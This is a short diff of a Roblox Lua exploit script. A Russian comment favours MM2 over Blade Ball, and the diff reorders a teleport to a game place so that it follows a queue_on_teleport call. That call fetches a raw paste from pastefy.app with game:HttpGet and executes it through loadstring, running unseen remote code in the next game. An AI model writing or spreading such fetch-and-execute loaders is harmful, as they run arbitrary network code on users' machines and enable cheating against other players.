@@ -1,7 +1,7 @@
 -- а зачем блейд болл когда есть мм2?
 
-game:GetService('TeleportService'):Teleport(142823291)
-
 queue_on_teleport('loadstring(game:HttpGet("https://pastefy.app/Qf4mFitx/raw", true))()')
+
+game:GetService('TeleportService'):Teleport(142823291)
 
 if true then return end
